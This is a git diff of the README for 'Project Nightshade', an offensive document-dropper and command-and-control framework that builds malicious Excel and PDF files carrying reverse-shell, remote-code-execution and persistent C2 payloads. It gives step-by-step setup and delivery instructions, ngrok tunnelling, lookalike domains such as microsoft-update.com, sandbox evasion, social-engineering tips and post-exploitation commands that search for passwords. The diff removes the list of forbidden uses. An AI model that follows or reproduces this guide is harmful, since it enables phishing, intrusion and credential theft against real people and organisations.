@@ -1,6 +1,6 @@
 # Project Nightshade - Advanced Document Dropper & C2 System
 
-**Author:** ek0ms savi0r  
+**By:** ek0ms savi0r  
 **A sophisticated penetration testing framework for authorized security research only.**
 
 ## Overview
@@ -11,6 +11,7 @@ Project Nightshade is an advanced Document dropper system with integrated Comman
 
 - **Multiple Document Types**: Excel (.xlsx) and PDF (.pdf) document support
 - **Multiple Payload Options**: Reverse Shell, RCE, Full C2 Agent
+- **Automatic Ngrok Integration**: Full TCP tunnel support for reverse shells
 - **OPSEC-Focused**: Domain rotation, ngrok tunneling, anti-analysis checks
 - **Encrypted Communications**: AES-256 encrypted C2 channels
 - **Persistence**: Multiple persistence mechanisms (scheduled tasks, registry, WMI)
@@ -48,78 +49,170 @@ sudo mv ngrok /usr/local/bin/
 ngrok config add-authtoken YOUR_AUTHTOKEN_HERE
 ```
 
-## Usage Guide
+##  Quick Start Guide
 
-### Step 1: Start the C2 Server
+### Option A: Reverse Shell T(Easiest Setup)
 
+1. **Start C2 Server:**
+   ```bash
+   python3 nightshade_staging.py
+   # Server starts on port 8080, reverse shell handler on port 4444
+   ```
+
+2. **Generate Dropper in seperate terminal:**
+   ```bash
+   python3 nightshade_dropper.py
+   ```
+   - Choose payload: `1` (Reverse Shell)
+   - Use default IP/port or enter your public IP
+   - Choose delivery: `1` (Ngrok tunneling)
+
+3. **The tool AUTOMATICALLY:**
+   - Starts ngrok TCP tunnel for port 4444
+   - Configures payload with correct ngrok address
+   - Generates your malicious document
+
+4. **Deliver the document and wait for connections!**
+
+### Option B: RCE/Full C2 (HTTP-Based)
+
+1. **Start C2 Server:**
+   ```bash
+   python3 nightshade_staging.py
+   ```
+
+2. **Start Ngrok HTTP Tunnel:**
+   ```bash
+   ngrok http 8080
+   ```
+
+3. **Generate Dropper:**
+   ```bash
+   python3 nightshade_dropper.py
+   ```
+   - Choose payload: `2` (RCE) or `3` (Full C2)
+   - Choose delivery: `1` (Ngrok tunneling)
+
+4. **The tool AUTOMATICALLY detects your ngrok URL and configures the payload!**
+
+## Detailed Usage
+
+### C2 Server Configuration
+
+The staging server runs on two ports:
+- **HTTP Server**: Port 8080 (for templates and C2 communications)
+- **Reverse Shell Handler**: Port 4444 (for direct shell connections)
+
+### Payload Types Explained
+
+#### 1. Reverse Shell (Payload Option 1)
+- **Direct Connection**: Connects directly to your IP:4444
+- **Ngrok Tunnel**: **AUTOMATIC** - Tool creates TCP tunnel and configures payload
+- **Best for**: Immediate interactive access
+
+#### 2. RCE + Persistence (Payload Option 2)  
+- **HTTP-Based**: Communicates via HTTP requests to C2 server
+- **Ngrok Compatible**: Works with HTTP tunnels (ngrok http 8080)
+- **Best for**: Stealthy command execution
+
+#### 3. Full C2 Agent (Payload Option 3)
+- **Advanced Features**: Encrypted comms, persistence, anti-analysis
+- **HTTP-Based**: Uses C2 HTTP endpoints
+- **Ngrok Compatible**: Works with HTTP tunnels
+- **Best for**: Long-term operations
+
+### Ngrok Configuration Made Simple
+
+#### For Reverse Shell (Payload 1):
 ```bash
-# Start the Nightshade C2 server
-python3 nightshade_staging.py
-
-# Server will start on http://127.0.0.1:8080
-# Reverse shell handler starts on port 4444
+# The tool handles this AUTOMATICALLY!
+# It will:
+# 1. Start ngrok tcp 4444
+# 2. Extract the public address (e.g., 1.tcp.ngrok.io:12345)
+# 3. Configure the payload with this address
 ```
 
-### Step 2: OPEN SECOND TERMINAL & Generate the Dropper
-
+#### For RCE/Full C2 (Payloads 2 & 3):
 ```bash
-# Run the interactive dropper generator
-cd project_nightshade
-python3 nightshade_dropper.py
-```
-
-### Step 3: Follow the Interactive Prompts
-
-**Document Type Selection:**
-- Automatically detects based on filename extension (.xlsx or .pdf)
-- Or specify manually by choosing appropriate filename
-
-**Payload Selection:**
-- `1` - Reverse Shell (connects to C2 on port 4444)
-- `2` - RCE + Persistence (uses HTTP C2 endpoints)
-- `3` - Full C2 Agent (advanced features)
-
-## C2 Configuration:
-
-**For Reverse Shell:**
-- If using direct connection: Use your server IP and port 4444
-- If using ngrok: Use the ngrok tunnel URL (no port needed)
-
-**For RCE/Full C2:**
-- If using direct connection: Use your server IP and port 8080  
-- If using ngrok: Use the ngrok tunnel URL (no port needed)
-
-### Ngrok Setup Example:
-```bash
-# Start ngrok tunnel for C2 server
+# Manual option (or let the tool detect it)
 ngrok http 8080
 
-# Ngrok will provide a URL like: https://abc123-def4-567.ngrok-free.app
-# Use this URL in your dropper configuration instead of your IP
+# The tool will automatically detect your ngrok URL
+# and use it in the payload configuration
 ```
 
-### Configuration Examples:
+### Configuration Examples
 
-**Direct Connection (No Ngrok):**
+#### Reverse Shell with Ngrok:
+```
+Payload Type: 1 (Reverse Shell)
+Delivery Method: 1 (Ngrok tunneling)
+```
 
-C2 Server: http://192.168.1.100:8080
-Reverse Shell: 192.168.1.100:4444
+### RCE with Ngrok :
+```
+Payload Type: 2 (RCE + Persistence)  
+Delivery Method: 1 (Ngrok tunneling)
+# Tool automatically detects your HTTP ngrok URL
+```
 
+#### RCE with Custom Domain:
+```
+Payload Type: 2 (RCE + Persistence)  
+Delivery Method: 3 (Custom domain)
+Custom Domain: your-c2-domain.com
+```
 
-**Ngrok Tunneling (Recommended for OPSEC):**
+### Custom Domain vs. Ngrok Domain
 
-C2 Server: https://abc123-def4-567.ngrok-free.app
-Reverse Shell: abc123-def4-567.ngrok-free.app:4444
+**Ngrok Domain (Automatic, Temporary):**
+- `https://abc123-def4-567.ngrok-free.app` (HTTP tunnel)
+- `1.tcp.ngrok.io:12345` (TCP tunnel)  
+- **Provided by ngrok**, random, changes every time
+- **Use Delivery Method: 1 (Ngrok tunneling)**
 
+**Custom Domain (Your Own, Permanent):**
+- `https://assets.microsoft-update.com` (your owned domain)
+- `c2.yourcompany.com` (your subdomain)
+- **You own this domain**, it doesn't change
+- **Use Delivery Method: 3 (Custom domain)**
 
-**Important**: When using ngrok, you don't need to specify ports for HTTP/HTTPS traffic, but you DO need to specify the port for reverse shell connections (ngrok exposes TCP ports differently).
+### When to Use Each:
 
+**Use Ngrok (Option 1) when:**
+- Quick testing
+- No budget for domains
+- Temporary operations
+- Don't care about reputation
 
-**Delivery Method:**
-- `1` - Ngrok tunneling (recommended)
-- `2` - Domain rotation
-- `3` - Custom domain
+**Use Custom Domain (Option 3) when:**
+- Long-term operations  
+- OPSEC matters (using legit-looking domains)
+- You own trustworthy domains
+- Budget for domain registration
 
+### Example of Custom Domain Setup:
+
+1. **Buy a domain:** `microsoft-update.com` (looks legit)
+2. **Set up DNS:** Point to your server IP or ngrok
+3. **In Nightshade:**
+   ```
+   Payload Type: 2 (RCE)
+   Delivery Method: 3 (Custom domain)  
+   Custom Domain: microsoft-update.com
+   ```
+
+The payload will then use `https://microsoft-update.com/template.ole` instead of ngrok URLs.
+
+The payload numbering is:
+```
+    1 = Reverse Shell (raw TCP)
+
+    2 = RCE + Persistence (HTTP C2)
+
+    3 = Full C2 Agent (advanced HTTP C2)
+```
+    
 ## Document Types & Capabilities
 
 ### Excel Documents (.xlsx)
@@ -136,147 +229,101 @@ Reverse Shell: abc123-def4-567.ngrok-free.app:4444
 - **Persistence**: Reader-specific update mechanisms
 - **Advantages**: No "Enable Content" prompt needed
 
-### Multi-Technique Approach
-The C2 server automatically detects the client type (Excel vs PDF Reader) and serves appropriate payloads with:
-- Different persistence mechanisms
-- Different download techniques
-- Application-specific OPSEC measures
-
 ## C2 Operations
 
-### After Successful Execution:
+### Monitoring Connections
 
-#### For Reverse Shell Payload:
-
+#### For Reverse Shell:
 ```bash
-# The C2 server automatically handles reverse shell connections
-# You'll see connections in the C2 server console
-
-# Available endpoints for monitoring:
-curl http://127.0.0.1:8080/c2/sessions
+# Connections appear automatically in the C2 server console
+[+] Reverse shell connection from 192.168.1.100:51542
 ```
 
-#### For RCE/Full C2 Payload:
-
+#### For RCE/Full C2:
 ```bash
-# View active sessions
-curl http://127.0.0.1:8080/c2/sessions
+# Check active sessions
+curl http://localhost:8080/c2/sessions
 
-# Send commands to a session
-curl -X POST http://127.0.0.1:8080/c2/command \
-  -H "Content-Type: application/json" \
-  -d '{"session_id": "SESSION_ID_HERE", "command": "whoami"}'
-
-# View server statistics (includes document type breakdown)
-curl http://127.0.0.1:8080/admin/stats
+# View server statistics
+curl http://localhost:8080/admin/stats
 ```
 
-### Example C2 Commands:
+### Example C2 Commands
 
 ```bash
-# System information
+# System reconnaissance
+whoami
 systeminfo
-whoami /all
-
-# Network reconnaissance
 ipconfig /all
-netstat -ano
 
-# Lateral movement
+# Lateral movement  
 net view
-net user
+net user /domain
 
 # Data collection
-dir C:\\Users\\ /s | findstr "password|secret|key"
+dir C:\Users\ /s | findstr "password|secret|key"
 ```
 
 ## OPSEC Considerations
 
-### Document-Specific OPSEC:
+### Infrastructure OPSEC
 
-**Excel Documents:**
-- Uses financial-themed templates
-- Realistic spreadsheet content
-- Professional formatting
-- Microsoft-consistent User-Agents
+**Ngrok Best Practices:**
+```
+# Region selection for better performance
+ngrok http 8080 --region eu
 
-**PDF Documents:**
-- Employee confidentiality agreements
-- Professional document formatting
-- Realistic form fields
-- Adobe-consistent User-Agents
+# Custom subdomains (plus plan required)
+ngrok http 8080 --subdomain your-custom-name
 
-### Infrastructure OPSEC:
-
-**Ngrok Tunneling:**
-```bash
-# Rotate tunnels regularly
-ngrok http 8080 --region eu --subdomain your-custom-subdomain
-# Use different regions for resilience
 # Available regions: us, eu, au, ap, sa, jp, in
 ```
 
 **Domain Rotation:**
-- The system includes built-in domain rotation for both Excel and PDF
-- Uses multiple benign-looking domains for template delivery
-- Automatically cycles through domains for OPSEC
+- Built-in domain rotation for template delivery
+- Uses legitimate-looking Microsoft/Adobe domains
+- Automatically cycles for operational security
 
-### Anti-Analysis Features:
-- Sandbox detection
-- VM detection
-- Debugger detection
-- Blacklisted process checking
+### Anti-Analysis Features
+
+- Sandbox detection (VM, sandbox, debugger checks)
 - Application-specific evasion techniques
+- Dynamic payload generation based on client type
+- Fileless, in-memory execution
 
-## Advanced Configuration
+## Troubleshooting
 
-### Customizing C2 Server:
+### Common Issues & Solutions
 
-Edit `nightshade_c2_server.py` configuration:
+** Reverse shell not connecting:**
+- Ensure you're using the latest version with ngrok TCP support
+- The tool now handles this automatically - no manual configuration needed
 
-```python
-class StagingConfig:
-    PORT = 8080
-    HOST = '0.0.0.0'
-    REVERSE_SHELL_PORT = 4444
-    USE_NGROK = True
-    ENCRYPTION_KEY = 'your-custom-encryption-key'
-    
-    # Excel-specific User-Agents
-    EXCEL_USER_AGENTS = [
-        'Microsoft Office Excel 2016',
-        'Microsoft Excel 2019',
-        # Add your custom User-Agents
-    ]
-```
+** Ngrok tunnel not detected:**
+- Make sure ngrok is authenticated: `ngrok config add-authtoken YOUR_TOKEN`
+- Check if ngrok is running: `pgrep ngrok`
 
-### Customizing Payloads:
+** "Enable Content" not clicked:**
+- Use PDF format for auto-execution
+- Social engineering: make document look legitimate
 
-**Excel-specific payloads:** `create_excel_payload()` function  
-**PDF-specific payloads:** `create_pdf_exploit_payload()` function
+** Quick Fix Checklist:**
+1. Update to latest version
+2. Use payload option 1 for easiest setup
+3. Let the tool handle ngrok automatically
+4. Start with Excel documents (higher success rate)
 
-Each uses different:
-- Persistence mechanisms
-- Download techniques
-- Execution methods
-- OPSEC measures
+### Debug Mode
 
-## Deployment Scenarios
+Enable verbose logging by checking the C2 server console for detailed connection information and errors.
 
-### Corporate Phishing:
-- Use Excel documents for financial departments
-- Use PDF documents for HR/legal departments
-- Tailor content to target audience
+## Pro Tips
 
-### Red Team Operations:
-- Mix document types to avoid pattern detection
-- Rotate delivery methods
-- Use geographic-specific domains
-
-### Security Testing:
-- Test both Office and PDF reader security policies
-- Evaluate different execution techniques
-- Measure detection rates for each document type
+1. **Start Simple**: Use Reverse Shell (option 1) for easiest setup
+2. **Let the Tool Work**: Don't manually start ngrok - the tool handles it
+3. **Test Locally First**: Try with direct IP before using ngrok
+4. **Use Both Formats**: Excel for corps, PDF for individual targets
+5. **Monitor Console**: Watch the C2 server for real-time connection info
 
 ## Legal & Ethical Notice
 
@@ -287,45 +334,14 @@ Each uses different:
 - Security research in controlled environments
 - Educational purposes in ethical hacking courses
 
-**Do NOT use for:**
-- Unauthorized testing
-- Malicious activities
-- Any illegal purposes
+**the dev of this tool assumes no liability and is not responsible for any misuse or damage caused by this program.**
 
-ek0ms savi0r assumes no liability and is not responsible for any misuse or damage caused by this program.
+## Companion, **lab cleaner**:
 
-## Troubleshooting
+Lab Cleaner is a defensive utility for Linux that helps you remove persistence and processes left behind when testing your own malware, droppers, or payloads on a lab system.
 
-### Common Issues:
+https://github.com/ekomsSavior/lab_cleaner
 
-**Excel file not loading template:**
-- Check if C2 server is running
-- Verify network connectivity
-- Check firewall settings
 
-**PDF not executing JavaScript:**
-- Ensure target has JavaScript enabled in PDF reader
-- Test with different Adobe Reader versions
-- Check C2 logs for User-Agent detection
 
-**General troubleshooting:**
-- Check C2 server logs for request details
-- Verify ngrok tunnel is active (if using)
-- Test with different document types
-
-## Pro Tips
-
-1. **Use Both Document Types**: Mix Excel and PDF for better coverage
-2. **Tailor to Target**: Use Excel for finance teams, PDF for HR/legal
-3. **Monitor C2 Dashboard**: Check `/admin/stats` for document type breakdown
-4. **Rotate Techniques**: Use different payloads for each document type
-5. **Test Detection Rates**: Evaluate which document type has lower detection
-6. **Region-Specific Delivery**: Use local domains for geographic targeting
-
----
-
-## DISCLAIMER: 
-
-Always operate within legal boundaries and with proper authorization. This tool is powerful and should be used responsibly by security professionals.
-
-**ek0ms savi0r**
+**ek0ms savi0r** 
